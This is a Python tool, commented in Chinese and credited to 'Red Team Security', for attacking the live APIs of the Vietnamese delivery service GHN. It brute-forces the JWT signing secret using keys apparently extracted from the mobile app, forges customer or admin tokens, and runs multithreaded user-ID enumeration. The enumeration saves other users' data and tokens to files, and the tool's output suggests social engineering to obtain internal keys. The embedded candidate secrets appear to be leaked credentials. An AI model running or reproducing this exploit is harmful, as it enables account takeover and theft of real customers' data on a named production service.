#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
GHN Token伪造工具 - 高级版
功能: JWT密钥破解、Token伪造、IDOR枚举
作者: Red Team Security
日期: 2025-10-24
"""

import hmac
import hashlib
import base64
import json
import time
import requests
import argparse
from typing import Dict, Optional, List, Tuple
from concurrent.futures import ThreadPoolExecutor
import sys

class Colors:
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    MAGENTA = '\033[95m'
    CYAN = '\033[96m'
    WHITE = '\033[97m'
    END = '\033[0m'
    BOLD = '\033[1m'

class GHNTokenForger:
    """GHN Token伪造与分析工具"""
    
    def __init__(self, verbose=True):
        self.verbose = verbose
        
        # 从逆向中提取的候选密钥
        self.candidate_secrets = [
            # 从BuildConfig提取
            "qQQEPch8diBLl1VGnJxk66TnQYjhRLZ1",  # Analytics凭证
            "xeV5x63Aj33jl9JmKPhrNsD8xzcqA5UV",  # FPT eKYC
            "d6a4ae02-b16b-4eca-bea8-ab4c0fbf55b6",  # SSO App Key
            
            # 从Bundle提取的十六进制字符串
            "07d82ee56d7aa3ee9a6386399478fb",
            "35d106f78464ea5447ce7a8fae715",
            "4ab47445f362c806bea2a9ebb7c420",
            "55123d895ba39ece1640ac5497bdd6",
            "683c54fd143e0114df98dbd3f1db1",
            
            # 常见密钥模式
            "ghn_secret_2024",
            "ghn@secret@2024",
            "giaohangnhanh",
            "ghn123456",
            "secret",
            "secret123",
            "jwt_secret",
            "ghn_jwt_secret",
            
            # UUID变体
            "18247208-798c-11ea-b4cd-22e6ddb3349b",
        ]
        
        # API端点
        self.api_base = "https://online-gateway.ghn.vn/shiip/public-api"
        self.sso_base = "https://sso.ghn.vn/sso/public-api/v2"
        
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'GHN/4.10.6 (Android 13; Build 191)',
            'Content-Type': 'application/json'
        })
    
    def log(self, msg: str, level: str = "INFO"):
        """日志输出"""
        if not self.verbose:
            return
        
        color = Colors.WHITE
        if level == "SUCCESS":
            color = Colors.GREEN
        elif level == "ERROR":
            color = Colors.RED
        elif level == "WARNING":
            color = Colors.YELLOW
        elif level == "INFO":
            color = Colors.CYAN
        
        print(f"{color}[{level}]{Colors.END} {msg}")
    
    def decode_jwt(self, token: str) -> Tuple[Optional[Dict], Optional[Dict], Optional[str]]:
        """解码JWT Token"""
        try:
            parts = token.split('.')
            
            if len(parts) != 3:
                self.log(f"Token格式错误，应为3部分，实际{len(parts)}部分", "ERROR")
                return None, None, None
            
            # 解码Header
            header_padded = parts[0] + '=' * (4 - len(parts[0]) % 4)
            header = json.loads(base64.urlsafe_b64decode(header_padded))
            
            # 解码Payload
            payload_padded = parts[1] + '=' * (4 - len(parts[1]) % 4)
            payload = json.loads(base64.urlsafe_b64decode(payload_padded))
            
            return header, payload, parts[2]
            
        except Exception as e:
            self.log(f"解码JWT失败: {e}", "ERROR")
            return None, None, None
    
    def forge_jwt(self, payload: Dict, secret: str, algorithm: str = "HS256") -> str:
        """伪造JWT Token"""
        
        # Header
        header = {
            "alg": algorithm,
            "typ": "JWT"
        }
        
        # Base64编码 (移除padding)
        header_b64 = base64.urlsafe_b64encode(
            json.dumps(header, separators=(',', ':')).encode()
        ).decode().rstrip('=')
        
        payload_b64 = base64.urlsafe_b64encode(
            json.dumps(payload, separators=(',', ':')).encode()
        ).decode().rstrip('=')
        
        # 生成HMAC签名
        message = f"{header_b64}.{payload_b64}"
        
        if algorithm == "HS256":
            signature = hmac.new(
                secret.encode(),
                message.encode(),
                hashlib.sha256
            ).digest()
        elif algorithm == "HS384":
            signature = hmac.new(
                secret.encode(),
                message.encode(),
                hashlib.sha384
            ).digest()
        elif algorithm == "HS512":
            signature = hmac.new(
                secret.encode(),
                message.encode(),
                hashlib.sha512
            ).digest()
        else:
            raise ValueError(f"不支持的算法: {algorithm}")
        
        signature_b64 = base64.urlsafe_b64encode(signature).decode().rstrip('=')
        
        # 组装Token
        forged_token = f"{header_b64}.{payload_b64}.{signature_b64}"
        
        return forged_token
    
    def verify_jwt_signature(self, token: str, secret: str) -> bool:
        """验证JWT签名是否匹配"""
        try:
            header, payload, signature_original = self.decode_jwt(token)
            
            if not header or not payload:
                return False
            
            # 重新生成Token
            forged = self.forge_jwt(payload, secret, header.get('alg', 'HS256'))
            
            # 比较签名部分
            return forged.split('.')[2] == signature_original
            
        except Exception as e:
            return False
    
    def test_token(self, token: str, endpoint: str = "/v2/user/info") -> Tuple[bool, Optional[Dict]]:
        """测试Token有效性"""
        try:
            r = self.session.get(
                f"{self.api_base}{endpoint}",
                headers={"Token": token},
                timeout=10
            )
            
            if r.status_code == 200:
                self.log(f"✅ Token有效! 端点: {endpoint}", "SUCCESS")
                try:
                    data = r.json()
                    return True, data
                except:
                    return True, None
            elif r.status_code == 401:
                self.log(f"❌ Token无效: {r.json().get('message', 'Unknown')}", "ERROR")
                return False, None
            else:
                self.log(f"⚠️  状态码: {r.status_code}", "WARNING")
                return False, None
                
        except Exception as e:
            self.log(f"测试Token失败: {e}", "ERROR")
            return False, None
    
    def brute_force_secret(self, valid_token: str) -> Optional[str]:
        """暴力破解JWT密钥"""
        self.log("开始JWT密钥暴力破解...", "INFO")
        self.log("=" * 60, "INFO")
        
        header, payload, signature = self.decode_jwt(valid_token)
        
        if not header or not payload:
            return None
        
        self.log(f"JWT Algorithm: {header.get('alg')}", "INFO")
        self.log(f"Payload Keys: {list(payload.keys())}", "INFO")
        self.log(f"测试 {len(self.candidate_secrets)} 个候选密钥...\n", "INFO")
        
        # 测试每个候选密钥
        for i, secret in enumerate(self.candidate_secrets, 1):
            if self.verbose:
                print(f"\r[{i}/{len(self.candidate_secrets)}] 测试: {secret[:30]}...", end='', flush=True)
            
            if self.verify_jwt_signature(valid_token, secret):
                print()  # 换行
                self.log(f"🔥 找到密钥!", "SUCCESS")
                self.log(f"密钥: {Colors.BOLD}{Colors.GREEN}{secret}{Colors.END}", "SUCCESS")
                return secret
        
        print()  # 换行
        self.log("未找到匹配的密钥", "WARNING")
        self.log("建议: 使用Hashcat进行离线暴力破解", "INFO")
        
        return None
    
    def forge_custom_token(self, secret: str, user_id: int, shop_id: Optional[int] = None, 
                          role: str = "customer", ttl_days: int = 365) -> str:
        """伪造自定义Token"""
        
        if shop_id is None:
            shop_id = user_id  # 假设shop_id = user_id
        
        current_time = int(time.time())
        
        payload = {
            "user_id": user_id,
            "shop_id": shop_id,
            "role": role,
            "iat": current_time,
            "exp": current_time + (ttl_days * 86400)
        }
        
        forged = self.forge_jwt(payload, secret)
        
        self.log(f"伪造Token: user_id={user_id}, role={role}", "SUCCESS")
        
        return forged
    
    def enumerate_users(self, secret: str, start_id: int = 1, count: int = 100, 
                        threads: int = 10) -> List[Tuple[int, str, Dict]]:
        """枚举用户ID并测试Token"""
        
        self.log(f"枚举用户 {start_id} 到 {start_id + count - 1}...", "INFO")
        self.log(f"使用 {threads} 个线程", "INFO")
        
        valid_tokens = []
        
        def test_user(user_id):
            token = self.forge_custom_token(secret, user_id, ttl_days=1)
            is_valid, data = self.test_token(token, "/v2/shop/all")
            
            if is_valid:
                self.log(f"找到有效用户: {user_id}", "SUCCESS")
                return (user_id, token, data)
            return None
        
        with ThreadPoolExecutor(max_workers=threads) as executor:
            results = list(executor.map(test_user, range(start_id, start_id + count)))
        
        valid_tokens = [r for r in results if r is not None]
        
        self.log(f"\n枚举完成! 找到 {len(valid_tokens)} 个有效用户", "SUCCESS")
        
        return valid_tokens
    
    def analyze_token_pattern(self, tokens: List[str]):
        """分析多个Token的模式"""
        self.log("\n分析Token模式...", "INFO")
        self.log("=" * 60, "INFO")
        
        patterns = []
        
        for i, token in enumerate(tokens, 1):
            header, payload, sig = self.decode_jwt(token)
            
            if payload:
                pattern = {
                    'user_id': payload.get('user_id'),
                    'shop_id': payload.get('shop_id'),
                    'iat': payload.get('iat'),
                    'exp': payload.get('exp'),
                    'ttl': payload.get('exp', 0) - payload.get('iat', 0)
                }
                patterns.append(pattern)
                
                self.log(f"\nToken #{i}:", "INFO")
                self.log(f"  User ID: {pattern['user_id']}", "INFO")
                self.log(f"  Shop ID: {pattern['shop_id']}", "INFO")
                self.log(f"  TTL: {pattern['ttl']/3600:.1f} 小时", "INFO")
        
        # 分析规律
        if len(patterns) >= 2:
            self.log("\n[规律分析]", "SUCCESS")
            
            user_ids = [p['user_id'] for p in patterns]
            shop_ids = [p['shop_id'] for p in patterns]
            ttls = [p['ttl'] for p in patterns]
            
            if all(u == s for u, s in zip(user_ids, shop_ids)):
                self.log("✅ shop_id = user_id", "SUCCESS")
            
            if len(set(ttls)) == 1:
                self.log(f"✅ TTL固定: {ttls[0]/3600:.1f} 小时", "SUCCESS")
            
            user_diff = [user_ids[i+1] - user_ids[i] for i in range(len(user_ids)-1)]
            if all(d == user_diff[0] for d in user_diff):
                self.log(f"✅ User ID连续递增: 步长={user_diff[0]}", "SUCCESS")

def main():
    parser = argparse.ArgumentParser(
        description='GHN Token伪造工具 - JWT密钥破解与Token生成'
    )
    
    parser.add_argument('--token', '-t', help='有效的JWT Token（用于分析）')
    parser.add_argument('--tokens-file', '-f', help='包含多个Token的文件（每行一个）')
    parser.add_argument('--secret', '-s', help='已知的JWT密钥（用于伪造）')
    parser.add_argument('--user-id', '-u', type=int, help='要伪造的用户ID')
    parser.add_argument('--role', '-r', default='customer', help='角色 (customer/admin)')
    parser.add_argument('--enum-start', type=int, default=1, help='枚举起始用户ID')
    parser.add_argument('--enum-count', type=int, default=100, help='枚举数量')
    parser.add_argument('--threads', type=int, default=10, help='线程数')
    parser.add_argument('--mode', choices=['analyze', 'brute', 'forge', 'enum', 'test'],
                       default='analyze', help='运行模式')
    parser.add_argument('--quiet', '-q', action='store_true', help='静默模式')
    
    args = parser.parse_args()
    
    forger = GHNTokenForger(verbose=not args.quiet)
    
    print(f"{Colors.BOLD}{Colors.CYAN}")
    print("=" * 60)
    print("  GHN Token Forger - 高级JWT伪造工具")
    print("  Version: 1.0")
    print("  Author: Red Team Security")
    print("=" * 60)
    print(f"{Colors.END}\n")
    
    # 模式: 分析Token
    if args.mode == 'analyze':
        if not args.token and not args.tokens_file:
            print(f"{Colors.RED}[ERROR]{Colors.END} 请提供 --token 或 --tokens_file")
            return
        
        tokens = []
        
        if args.token:
            tokens.append(args.token)
        
        if args.tokens_file:
            with open(args.tokens_file, 'r') as f:
                tokens.extend([line.strip() for line in f if line.strip()])
        
        forger.log(f"共 {len(tokens)} 个Token待分析\n", "INFO")
        
        for i, token in enumerate(tokens, 1):
            forger.log(f"\n分析 Token #{i}:", "INFO")
            forger.log("-" * 40, "INFO")
            
            header, payload, sig = forger.decode_jwt(token)
            
            if header and payload:
                forger.log(f"Header: {json.dumps(header, indent=2)}", "INFO")
                forger.log(f"Payload: {json.dumps(payload, indent=2)}", "INFO")
                forger.log(f"Signature (前20字符): {sig[:20]}...", "INFO")
        
        # 分析模式
        if len(tokens) > 1:
            forger.analyze_token_pattern(tokens)
    
    # 模式: 暴力破解密钥
    elif args.mode == 'brute':
        if not args.token:
            print(f"{Colors.RED}[ERROR]{Colors.END} 请提供 --token")
            return
        
        secret = forger.brute_force_secret(args.token)
        
        if secret:
            forger.log(f"\n🎉 成功破解密钥: {secret}", "SUCCESS")
            forger.log(f"\n保存密钥到 ghn_secret.txt", "INFO")
            
            with open("ghn_secret.txt", "w") as f:
                f.write(secret)
        else:
            forger.log("\n未能破解密钥，尝试:", "WARNING")
            forger.log("  1. 使用Hashcat离线暴力破解", "INFO")
            forger.log("  2. 收集更多Token样本", "INFO")
            forger.log("  3. 社工获取内部密钥", "INFO")
    
    # 模式: 伪造Token
    elif args.mode == 'forge':
        if not args.secret:
            print(f"{Colors.RED}[ERROR]{Colors.END} 请提供 --secret")
            return
        
        if not args.user_id:
            print(f"{Colors.RED}[ERROR]{Colors.END} 请提供 --user-id")
            return
        
        forged_token = forger.forge_custom_token(
            args.secret,
            args.user_id,
            role=args.role
        )
        
        forger.log(f"\n伪造的Token:", "SUCCESS")
        print(f"{Colors.BOLD}{Colors.GREEN}{forged_token}{Colors.END}\n")
        
        # 测试Token
        choice = input("是否测试Token有效性? (y/n): ")
        if choice.lower() == 'y':
            forger.test_token(forged_token)
    
    # 模式: 枚举用户
    elif args.mode == 'enum':
        if not args.secret:
            print(f"{Colors.RED}[ERROR]{Colors.END} 请提供 --secret")
            return
        
        valid_users = forger.enumerate_users(
            args.secret,
            args.enum_start,
            args.enum_count,
            args.threads
        )
        
        # 保存结果
        if valid_users:
            filename = f"ghn_valid_users_{int(time.time())}.json"
            with open(filename, 'w') as f:
                json.dump([
                    {"user_id": uid, "token": tok, "data": data}
                    for uid, tok, data in valid_users
                ], f, indent=2)
            
            forger.log(f"\n结果已保存至: {filename}", "SUCCESS")
    
    # 模式: 测试Token
    elif args.mode == 'test':
        if not args.token:
            print(f"{Colors.RED}[ERROR]{Colors.END} 请提供 --token")
            return
        
        forger.test_token(args.token)

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n{Colors.YELLOW}[!] 用户中断{Colors.END}")
        sys.exit(0)
